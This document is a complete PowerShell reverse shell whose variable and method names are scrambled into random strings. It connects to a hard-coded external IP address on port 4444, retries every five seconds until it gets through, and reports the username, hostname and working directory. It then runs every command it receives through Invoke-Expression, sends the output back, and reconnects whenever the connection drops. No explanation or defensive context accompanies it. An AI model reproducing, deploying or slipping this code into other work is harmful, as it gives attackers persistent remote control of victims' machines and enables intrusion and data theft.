class ChYlVkBoHuajLk {
    
    [string]$NmpWilkADfRQsS = "93.49.240.195"
    [int]$DDkTJDg = 4444

    $UZQntrMciIdvBFBUQ
    $fhHdCX
    $SjnJWHADHYk
    $yoyTM
    $TpECwfonDdw
    $YQfPmxPdxAttlID
    [int]$DJffRDznxBQNzIzXDXJlFH = 50*1024

    lBEchpZaL() {
        $this.fhHdCX = $false
        while ($true) {
            try {
                $this.fhHdCX = New-Object Net.Sockets.TcpClient($this.NmpWilkADfRQsS, $this.DDkTJDg)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.rfnznv()
    }

    rfnznv() {
        $this.UZQntrMciIdvBFBUQ = $this.fhHdCX.GetStream()
        $this.yoyTM = New-Object Byte[] $this.DJffRDznxBQNzIzXDXJlFH
        $this.YQfPmxPdxAttlID = New-Object Text.UTF8Encoding
        $this.SjnJWHADHYk = New-Object IO.StreamWriter($this.UZQntrMciIdvBFBUQ, [Text.Encoding]::UTF8, $this.DJffRDznxBQNzIzXDXJlFH)
        $this.TpECwfonDdw = New-Object System.IO.StreamReader($this.UZQntrMciIdvBFBUQ)
        $this.SjnJWHADHYk.AutoFlush = $true
    }

    obwBpMjeLsF() {
        $this.lBEchpZaL()
        $this.YuijMrcfVwPcljAipLfb()
    }

    aKbGK($aCzUCCbAFQuejrbxVZUTOvJf) {
        try {
            [byte[]]$HtRzFeIXUvygCtrvRRxOA = [text.Encoding]::Ascii.GetBytes($aCzUCCbAFQuejrbxVZUTOvJf)
            $this.SjnJWHADHYk.Write($HtRzFeIXUvygCtrvRRxOA, 0, $HtRzFeIXUvygCtrvRRxOA.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.obwBpMjeLsF()
        }
    }

    [string] XZprqUClsQCULKDYMB() {
        try {
            $AViMHdoUCpPfMqrAtUXXf = $this.UZQntrMciIdvBFBUQ.Read($this.yoyTM, 0, $this.DJffRDznxBQNzIzXDXJlFH)    
            $CiQVLNmgeJnT = ($this.YQfPmxPdxAttlID.GetString($this.yoyTM, 0, $AViMHdoUCpPfMqrAtUXXf))
            return $CiQVLNmgeJnT
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.obwBpMjeLsF()
            return ""
        }
    }

    [string] fqAsrCiCbiwJneRmesQwUfpl($kfxOKrrFgg) {
        Write-Host $kfxOKrrFgg
        try { 
            $IMvDOOwAwTaBsrAHMZrgLly = Invoke-Expression $kfxOKrrFgg | Out-String
        }
        catch {
            $fVGdAIN = $_.Exception
            $keCBOrYamVkRsZsUg = $_.Message
            $IMvDOOwAwTaBsrAHMZrgLly = "`n$_`n"
        }
        return $IMvDOOwAwTaBsrAHMZrgLly
    }

    [string] NWdtTIUrnGrllzRuvuw() {
        $nPSaxiANeBvzmvoanFhdLU = [Environment]::UserName
        $GYssyroFixw = [System.Net.Dns]::GetHostName()
        $IsABaGACvJuPpEBjUFLFSjR = Get-Location
        return "$nPSaxiANeBvzmvoanFhdLU@$GYssyroFixw [$IsABaGACvJuPpEBjUFLFSjR]~$ "
    }

    YuijMrcfVwPcljAipLfb() {
        while ($this.fhHdCX.Connected) {
            $this.aKbGK($this.NWdtTIUrnGrllzRuvuw())         
            $CiQVLNmgeJnT = $this.XZprqUClsQCULKDYMB()
            $IMvDOOwAwTaBsrAHMZrgLly = "`n"
            if ([string]::IsNullOrEmpty($CiQVLNmgeJnT)) {
                continue
            }
            $IMvDOOwAwTaBsrAHMZrgLly = $this.fqAsrCiCbiwJneRmesQwUfpl($CiQVLNmgeJnT)
            $this.aKbGK($IMvDOOwAwTaBsrAHMZrgLly + "`n")
            $this.UZQntrMciIdvBFBUQ.Flush()
        }
        $this.fhHdCX.Close()
        $this.obwBpMjeLsF()
    } 
}

$iMHmneznDJPoQiMxtYal = [ChYlVkBoHuajLk]::new()
$iMHmneznDJPoQiMxtYal.obwBpMjeLsF()
